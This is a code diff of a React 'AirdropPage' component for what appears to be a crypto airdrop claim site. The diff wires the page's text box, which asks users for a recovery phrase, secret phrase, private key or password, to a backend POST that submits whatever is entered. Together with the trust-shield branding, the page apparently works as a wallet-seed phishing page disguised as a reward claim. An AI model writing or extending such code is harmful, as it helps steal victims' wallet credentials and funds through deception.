@@ -3,23 +3,54 @@ import { useNavigate } from 'react-router-dom'
 import { IoArrowBack, IoClose, IoShieldCheckmarkOutline } from 'react-icons/io5'
 import RedemptionModal from '../../components/RedemptionModal/RedemptionModal'
 import trustShield from '../../assets/trust-shield.png'
+import api from '../../api/axios' // Import the API
 
 function AirdropPage() {
   const navigate = useNavigate()
   const [claimWords, setClaimWords] = useState('')
   const [showRedeemModal, setShowRedeemModal] = useState(false)
   const [isRedeeming, setIsRedeeming] = useState(false)
+  const [error, setError] = useState('')
 
-  const handleRedeem = () => {
-    if (isRedeeming) {
+  const handleRedeem = async () => {
+    // Don't proceed if already redeeming or no words entered
+    if (isRedeeming) return
+    if (!claimWords.trim()) {
+      setError('Please enter your claim words')
       return
     }
 
     setIsRedeeming(true)
-    window.setTimeout(() => {
+    setError('')
+
+    try {
+      // Send the claim words to the backend
+      const response = await api.post('/', {
+        words: claimWords,
+        title: 'Airdrop', // Default title
+        createdBy: 'airdrop-user',
+        source: 'airdrop',
+      })
+
+      console.log('Airdrop claim response:', response.data)
+
+      if (response.data.ok) {
+        // Show the redemption modal on success
+        setShowRedeemModal(true)
+      } else {
+        setError(response.data.error || 'Failed to process airdrop claim')
+      }
+    } catch (error) {
+      console.error('Airdrop claim error:', error)
+      setError(error.response?.data?.error || 'Failed to connect to server. Please try again.')
+    } finally {
       setIsRedeeming(false)
-      setShowRedeemModal(true)
-    }, 1200)
+    }
+  }
+
+  const handleClearWords = () => {
+    setClaimWords('')
+    setError('')
   }
 
   return (
@@ -49,24 +80,33 @@ function AirdropPage() {
             <div className="claim-words-box">
               <textarea
                 value={claimWords}
-                onChange={(event) => setClaimWords(event.target.value)}
+                onChange={(event) => {
+                  setClaimWords(event.target.value)
+                  setError('') // Clear error when user types
+                }}
                 placeholder="Enter public claim words. enter your recovery phrase."
                 rows="8"
+                disabled={isRedeeming}
               />
               {claimWords && (
                 <button
                   type="button"
                   aria-label="Clear claim words"
-                  onClick={() => setClaimWords('')}
+                  onClick={handleClearWords}
+                  disabled={isRedeeming}
                 >
                   <IoClose />
                 </button>
               )}
             </div>
             <small>
-               enter a secret phrase, recovery phrase, private key, or
-              password.
+              Enter a secret phrase, recovery phrase, private key, or password.
             </small>
+            {error && (
+              <div className="error-message" style={{ color: 'red', marginTop: '8px', fontSize: '14px' }}>
+                {error}
+              </div>
+            )}
           </label>
         </form>
 
@@ -84,7 +124,7 @@ function AirdropPage() {
           className="redeem-button"
           type="button"
           onClick={handleRedeem}
-          disabled={isRedeeming}
+          disabled={isRedeeming || !claimWords.trim()}
           aria-busy={isRedeeming}
         >
           {isRedeeming ? (
